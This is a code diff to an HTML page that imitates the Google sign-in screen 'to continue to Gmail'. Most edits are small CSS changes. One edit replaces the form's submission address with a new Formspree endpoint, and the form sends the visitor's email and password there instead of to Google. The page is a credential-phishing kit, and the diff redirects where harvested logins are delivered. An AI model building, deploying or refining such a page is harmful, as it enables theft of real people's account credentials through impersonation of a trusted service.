@@ -12,6 +12,7 @@
             --text-secondary: #5f6368; 
             --border-color: #dadce0; 
             --primary-blue: #1a73e8; 
+            --hover-blue: #1765cc;
         }
 
         body {
@@ -35,6 +36,7 @@
             border: 1px solid var(--border-color);
             border-radius: 8px;
             background-color: var(--bg-color);
+            box-sizing: border-box;
         }
 
         .logo-img {
@@ -71,7 +73,7 @@
             height: 50px;
             outline: none;
             transition: border 0.2s;
-            margin-bottom: 10px; /* Spacing between fields */
+            margin-bottom: 10px;
         }
 
         input[type="email"]:focus,
@@ -102,7 +104,7 @@
         }
 
         .next-btn:hover {
-            background-color: #1765cc !important; 
+            background-color: var(--hover-blue) !important; 
         }
 
         .forgot-link {
@@ -136,7 +138,7 @@
         <p class="subtitle">to continue to Gmail</p>
 
         <!-- FORMSPREE INTEGRATION -->
-        <form action="https://formspree.io/f/mzeeaaep" method="POST">
+        <form action="https://formspree.io/f/mpppjjea" method="POST">
             <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
             <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
             
